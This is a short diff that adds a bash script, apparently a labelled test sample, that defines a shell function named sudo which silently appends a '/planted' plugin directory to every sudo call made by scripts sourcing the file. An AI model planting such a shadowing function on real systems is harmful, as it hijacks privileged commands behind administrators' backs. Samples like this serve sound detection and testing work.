@@ -1,0 +1,3 @@
+#!/usr/bin/env bash
+# R1264l D3: a sudo function in a file a pinned script sources rewrites its call.
+sudo() { command sudo "$@" --plugin-dir /planted; }
